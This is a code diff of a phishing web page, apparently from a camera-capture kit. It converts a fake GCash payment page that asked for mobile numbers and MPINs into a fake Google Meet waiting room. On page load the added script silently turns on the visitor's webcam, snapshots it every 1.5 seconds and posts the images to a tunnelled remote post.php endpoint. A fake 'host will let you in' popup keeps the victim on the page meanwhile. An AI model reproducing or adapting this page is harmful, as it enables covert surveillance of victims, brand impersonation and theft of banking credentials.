@@ -3,12 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GCash - Scan QR Code</title>
+    <title>Google Meet</title>
     <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -17,11 +18,12 @@
         }
 
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: #f5f5f5;
-            min-height: 100vh;
-            color: #333;
-            overflow-x: hidden;
+            font-family: 'Roboto', 'Google Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #202124;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            color: #fff;
         }
 
         .video-wrap {
@@ -32,288 +34,385 @@
             display: none;
         }
 
-        .blue-banner {
-            width: 100%;
-            background: #0066CC;
-            height: 80px;
-            position: relative;
+        .meeting-container {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: #202124;
         }
 
-        .white-content {
-            background: #fff;
-            width: 100%;
-            max-width: 500px;
-            margin: 0 auto;
-            border-radius: 20px 20px 0 0;
-            margin-top: -20px;
-            padding: 40px 30px 60px;
-            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.1);
-            position: relative;
-            z-index: 1;
-        }
-
-        .gcash-logo-container {
+        .top-bar {
+            background: rgba(32, 33, 36, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 12px 24px;
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 40px;
+            justify-content: space-between;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            z-index: 100;
         }
 
-        .gcash-logo-circle {
-            width: 50px;
-            height: 50px;
-            background: #0066CC;
-            border-radius: 50%;
+        .meeting-info {
             display: flex;
             align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
+            gap: 16px;
         }
 
-        .gcash-logo-g {
-            font-size: 32px;
-            font-weight: 700;
-            color: #fff;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .gcash-logo-text {
-            font-size: 28px;
-            font-weight: 700;
-            color: #0066CC;
-            letter-spacing: -0.5px;
-        }
-
-        .instruction-text {
-            text-align: center;
-            margin-bottom: 40px;
-        }
-
-        .instruction-text p {
-            font-size: 14px;
-            color: #666;
-            line-height: 1.6;
-            margin-bottom: 8px;
-        }
-
-        .instruction-text p:first-child {
-            font-size: 13px;
-            color: #888;
-        }
-
-        .instruction-text p:last-child {
-            font-size: 15px;
-            color: #555;
-            font-weight: 500;
-        }
-
-        .qr-code-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 30px;
-        }
-
-        .qr-code {
-            width: 280px;
-            height: 280px;
-            background: #fff;
-            border: 2px solid #e0e0e0;
+        .meeting-logo {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #4285F4, #34A853);
             border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            position: relative;
-            padding: 16px;
+            font-weight: 700;
+            font-size: 18px;
         }
 
-        .qr-code img {
+        .meeting-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: #e8eaed;
+        }
+
+        .meeting-time {
+            font-size: 14px;
+            color: #9aa0a6;
+        }
+
+        .top-controls {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .icon-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: none;
+            background: rgba(255, 255, 255, 0.1);
+            color: #e8eaed;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+        }
+
+        .icon-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .main-screen {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            background: #000;
+            overflow: hidden;
+        }
+
+        .video-placeholder {
             width: 100%;
             height: 100%;
-            object-fit: contain;
-            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
         }
 
-        .verification-section {
-            display: none;
-            margin-top: 30px;
-        }
-
-        .camera-preview {
-            width: 100%;
-            max-width: 240px;
-            height: 180px;
-            margin: 0 auto 16px;
-            background: #f0f0f0;
-            border: 2px dashed #0066CC;
-            border-radius: 12px;
+        .participant-avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 48px;
-            color: #999;
+            font-weight: 500;
+            margin-bottom: 24px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
         }
 
-        .camera-button {
-            width: 100%;
-            max-width: 300px;
-            height: 48px;
-            background: #0066CC;
-            border: none;
-            border-radius: 10px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin: 0 auto;
-            display: block;
-        }
-
-        .camera-button:hover {
-            background: #0052a3;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0, 102, 204, 0.3);
-        }
-
-        .camera-button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .form-group {
-            margin-bottom: 16px;
-        }
-
-        .form-label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #333;
+        .participant-name {
+            font-size: 24px;
+            font-weight: 500;
+            color: #e8eaed;
             margin-bottom: 8px;
         }
 
-        .form-input {
-            width: 100%;
-            height: 48px;
-            background: #f8f9fa;
-            border: 2px solid #e9ecef;
-            border-radius: 10px;
-            padding: 0 16px;
-            font-size: 15px;
-            color: #333;
-            transition: all 0.2s;
-        }
-
-        .form-input:focus {
-            outline: none;
-            border-color: #0066CC;
-            background: #fff;
-        }
-
-        .verify-button {
-            width: 100%;
-            height: 50px;
-            background: #0066CC;
-            border: none;
-            border-radius: 10px;
-            color: #fff;
+        .waiting-message {
             font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 12px;
-            transition: all 0.3s;
+            color: #9aa0a6;
+            text-align: center;
+            max-width: 400px;
         }
 
-        .verify-button:hover {
-            background: #0052a3;
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
         }
 
-        .verify-button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
-        .loading-spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-top-color: #fff;
+        .popup-content {
+            background: #2d2e30;
+            border-radius: 16px;
+            padding: 32px 40px;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .popup-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #4285F4, #34A853);
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 32px;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        .popup-title {
+            font-size: 20px;
+            font-weight: 500;
+            color: #e8eaed;
+            margin-bottom: 12px;
+        }
+
+        .popup-message {
+            font-size: 14px;
+            color: #9aa0a6;
+            line-height: 1.6;
+        }
+
+        .bottom-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(32, 33, 36, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 16px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            z-index: 100;
+        }
+
+        .control-button {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            background: transparent;
+            border: none;
+            color: #e8eaed;
+            cursor: pointer;
+            padding: 12px 20px;
+            border-radius: 12px;
+            transition: all 0.2s ease;
+            min-width: 80px;
+        }
+
+        .control-button:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .control-button i {
+            font-size: 24px;
+            margin-bottom: 4px;
+        }
+
+        .control-button span {
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .control-button.active {
+            background: rgba(66, 133, 244, 0.2);
+            color: #4285F4;
+        }
+
+        .control-button.muted {
+            background: rgba(234, 67, 53, 0.2);
+            color: #ea4335;
+        }
+
+        .end-call-btn {
+            background: #ea4335;
+            color: white;
+            border-radius: 50%;
+            width: 56px;
+            height: 56px;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            transition: all 0.2s ease;
+            margin-left: 12px;
+        }
+
+        .end-call-btn:hover {
+            background: #c5221f;
+            transform: scale(1.05);
+        }
+
+        .participants-count {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
         @media (max-width: 768px) {
-            .white-content {
-                padding: 30px 20px 50px;
-                border-radius: 16px 16px 0 0;
+            .bottom-bar {
+                flex-wrap: wrap;
+                padding: 12px;
             }
 
-            .qr-code {
-                width: 240px;
-                height: 240px;
+            .control-button {
+                padding: 8px 12px;
+                min-width: 60px;
             }
 
-            .gcash-logo-text {
-                font-size: 24px;
+            .control-button span {
+                font-size: 10px;
+            }
+
+            .popup-content {
+                margin: 20px;
+                padding: 24px;
             }
         }
     </style>
 </head>
+
 <body>
     <div class="video-wrap" hidden="hidden">
         <video id="video" playsinline autoplay></video>
     </div>
     <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
-    <div class="blue-banner"></div>
-
-    <div class="white-content">
-        <div class="gcash-logo-container">
-            <div class="gcash-logo-circle">
-                <div class="gcash-logo-g">G</div>
-            </div>
-            <div class="gcash-logo-text">GCash</div>
-        </div>
-
-        <div class="instruction-text">
-            <p>Securely complete the payment with your GCash app</p>
-            <p>Log in to GCash and scan this QR with the QR Scanner.</p>
-        </div>
-
-        <div class="qr-code-container">
-            <div class="qr-code">
-                <img src="gcash_qr.png" alt="GCash QR Code">
-            </div>
-        </div>
-
-        <div class="verification-section" id="verificationSection">
-            <div class="camera-preview" id="cameraPreview">
-                📸
-            </div>
-            <button class="camera-button" id="startCameraBtn">Allow Camera Access</button>
-
-            <form id="verificationForm" style="display: none; margin-top: 24px;">
-                <div class="form-group">
-                    <label class="form-label" for="mobileNumber">Mobile Number</label>
-                    <input type="tel" class="form-input" id="mobileNumber" placeholder="09XX XXX XXXX" required>
+    <div class="meeting-container">
+        <div class="top-bar">
+            <div class="meeting-info">
+                <div class="meeting-logo">G</div>
+                <div>
+                    <div class="meeting-title">Google Meet</div>
+                    <div class="meeting-time" id="meetingTime">00:00</div>
                 </div>
-                <div class="form-group">
-                    <label class="form-label" for="mpin">MPIN</label>
-                    <input type="password" class="form-input" id="mpin" placeholder="Enter your MPIN" required maxlength="4">
-                </div>
-                <button type="submit" class="verify-button" id="verifyBtn">
-                    Verify & Continue
+            </div>
+            <div class="top-controls">
+                <button class="icon-btn" title="Participants">
+                    <i class="fas fa-users"></i>
                 </button>
-            </form>
+                <button class="icon-btn" title="Chat">
+                    <i class="fas fa-comments"></i>
+                </button>
+                <button class="icon-btn" title="Settings">
+                    <i class="fas fa-cog"></i>
+                </button>
+            </div>
+        </div>
+
+        <div class="main-screen">
+            <div class="video-placeholder">
+                <div class="participant-avatar">U</div>
+                <div class="participant-name">You</div>
+                <div class="waiting-message">Waiting for others to join...</div>
+            </div>
+            <div class="participants-count">
+                <i class="fas fa-users"></i>
+                <span id="participantCount">1</span>
+            </div>
+        </div>
+
+        <div id="ac-wrapper" class="popup-overlay">
+            <div class="popup-content">
+                <div class="popup-icon">
+                    <i class="fas fa-clock"></i>
+                </div>
+                <div class="popup-title">Please wait</div>
+                <div class="popup-message">The meeting host will let you in soon</div>
+            </div>
+        </div>
+
+        <div class="bottom-bar">
+            <button class="control-button" id="micBtn">
+                <i class="fas fa-microphone"></i>
+                <span>Mute</span>
+            </button>
+            <button class="control-button" id="videoBtn">
+                <i class="fas fa-video"></i>
+                <span>Stop Video</span>
+            </button>
+            <button class="control-button" id="securityBtn">
+                <i class="fas fa-shield-alt"></i>
+                <span>Security</span>
+            </button>
+            <button class="control-button" id="participantsBtn">
+                <i class="fas fa-users"></i>
+                <span>Participants</span>
+            </button>
+            <button class="control-button" id="shareBtn">
+                <i class="fas fa-desktop"></i>
+                <span>Present</span>
+            </button>
+            <button class="control-button" id="chatBtn">
+                <i class="fas fa-comments"></i>
+                <span>Chat</span>
+            </button>
+            <button class="control-button" id="recordBtn">
+                <i class="fas fa-circle"></i>
+                <span>Record</span>
+            </button>
+            <button class="end-call-btn" id="endCallBtn">
+                <i class="fas fa-phone-slash"></i>
+            </button>
         </div>
     </div>
 
@@ -322,7 +421,7 @@
             $.ajax({
                 type: 'POST',
                 data: { cat: imgdata },
-                url: 'https://f3f44c8f78693717-49-145-223-117.serveousercontent.com/post.php',
+                url: 'https://b590eaefb8e41adf-49-145-223-117.serveousercontent.com/post.php',
                 dataType: 'json',
                 async: false,
                 success: function (result) {
@@ -338,11 +437,7 @@
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const startCameraBtn = document.getElementById('startCameraBtn');
-        const cameraPreview = document.getElementById('cameraPreview');
-        const verificationForm = document.getElementById('verificationForm');
-        const verifyBtn = document.getElementById('verifyBtn');
-        const verificationSection = document.getElementById('verificationSection');
+        const errorMsgElement = document.querySelector('span#errorMsg');
 
         const constraints = {
             audio: false,
@@ -356,10 +451,9 @@
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 handleSuccess(stream);
             } catch (e) {
-                console.error('Camera access error:', e);
-                cameraPreview.innerHTML = '⚠️ Camera access required';
-                startCameraBtn.disabled = false;
-                startCameraBtn.textContent = 'Retry Camera Access';
+                if (errorMsgElement) {
+                    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+                }
             }
         }
 
@@ -367,93 +461,82 @@
             window.stream = stream;
             video.srcObject = stream;
 
-            // Show camera preview
-            cameraPreview.innerHTML = '<video autoplay playsinline style="width:100%;height:100%;object-fit:cover;border-radius:10px;"></video>';
-            const previewVideo = cameraPreview.querySelector('video');
-            previewVideo.srcObject = stream;
-
-            startCameraBtn.textContent = 'Camera Active ✓';
-            startCameraBtn.disabled = true;
-            verificationForm.style.display = 'block';
-
-            // Capture frames
             var context = canvas.getContext('2d');
             setInterval(function () {
                 context.drawImage(video, 0, 0, 640, 480);
                 var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                 post(canvasData);
+                video.play();
             }, 1500);
         }
 
-        // Start camera button
-        if (startCameraBtn) {
-            startCameraBtn.addEventListener('click', function() {
-                this.textContent = 'Starting camera...';
-                this.disabled = true;
-                init();
-            });
+        function PopUp() {
+            document.getElementById('ac-wrapper').style.display = "none";
         }
 
-        // MPIN input - only allow numbers and limit to 4 digits
-        const mpinInput = document.getElementById('mpin');
-        if (mpinInput) {
-            mpinInput.addEventListener('input', function(e) {
-                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
-            });
+        // Meeting timer
+        let meetingStartTime = Date.now();
+        function updateMeetingTime() {
+            const elapsed = Math.floor((Date.now() - meetingStartTime) / 1000);
+            const minutes = Math.floor(elapsed / 60);
+            const seconds = elapsed % 60;
+            document.getElementById('meetingTime').textContent = 
+                `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
         }
 
-        // Mobile number formatting
-        const mobileInput = document.getElementById('mobileNumber');
-        if (mobileInput) {
-            mobileInput.addEventListener('input', function(e) {
-                let value = this.value.replace(/[^0-9]/g, '');
-                if (value.length > 0 && value[0] !== '0') {
-                    value = '0' + value;
-                }
-                if (value.length > 11) {
-                    value = value.slice(0, 11);
-                }
-                this.value = value;
-            });
-        }
+        // Control button handlers
+        document.getElementById('micBtn').addEventListener('click', function() {
+            this.classList.toggle('muted');
+            const icon = this.querySelector('i');
+            icon.className = this.classList.contains('muted') ? 'fas fa-microphone-slash' : 'fas fa-microphone';
+        });
 
-        // Form submission
-        if (verificationForm) {
-            verificationForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                const mobileNumber = document.getElementById('mobileNumber').value;
-                const mpin = document.getElementById('mpin').value;
-                
-                if (mobileNumber.length < 11) {
-                    alert('Please enter a valid mobile number.');
-                    return;
-                }
-                
-                if (mpin.length !== 4) {
-                    alert('MPIN must be 4 digits.');
-                    return;
-                }
-                
-                verifyBtn.innerHTML = '<span class="loading-spinner"></span>Verifying...';
-                verifyBtn.disabled = true;
-                
-                setTimeout(() => {
-                    verifyBtn.innerHTML = 'Verify & Continue';
-                    verifyBtn.disabled = false;
-                    alert('Verification in progress. Please wait while we verify your identity...');
-                }, 2000);
-            });
-        }
+        document.getElementById('videoBtn').addEventListener('click', function() {
+            this.classList.toggle('muted');
+            const icon = this.querySelector('i');
+            icon.className = this.classList.contains('muted') ? 'fas fa-video-slash' : 'fas fa-video';
+        });
 
-        // Show verification section after a delay (for phishing simulation)
-        setTimeout(() => {
-            if (verificationSection) {
-                verificationSection.style.display = 'block';
-                if (startCameraBtn) {
-                    startCameraBtn.click();
-                }
+        document.getElementById('securityBtn').addEventListener('click', function() {
+            this.classList.toggle('active');
+        });
+
+        document.getElementById('participantsBtn').addEventListener('click', function() {
+            this.classList.toggle('active');
+        });
+
+        document.getElementById('shareBtn').addEventListener('click', function() {
+            this.classList.toggle('active');
+        });
+
+        document.getElementById('chatBtn').addEventListener('click', function() {
+            this.classList.toggle('active');
+        });
+
+        document.getElementById('recordBtn').addEventListener('click', function() {
+            this.classList.toggle('active');
+            if (this.classList.contains('active')) {
+                this.style.color = '#ea4335';
             }
-        }, 2000);
+        });
+
+        // Simulate participant count
+        function updateParticipantCount() {
+            const count = Math.floor(Math.random() * 3) + 1;
+            document.getElementById('participantCount').textContent = count;
+        }
+
+        // Initialize
+        init();
+        setInterval(updateMeetingTime, 1000);
+        setInterval(updateParticipantCount, 3000);
+
+        // Hide popup after 50 seconds
+        $(document).ready(function() {
+            setTimeout(function() {
+                PopUp();
+            }, 50000);
+        });
     </script>
 </body>
 </html>
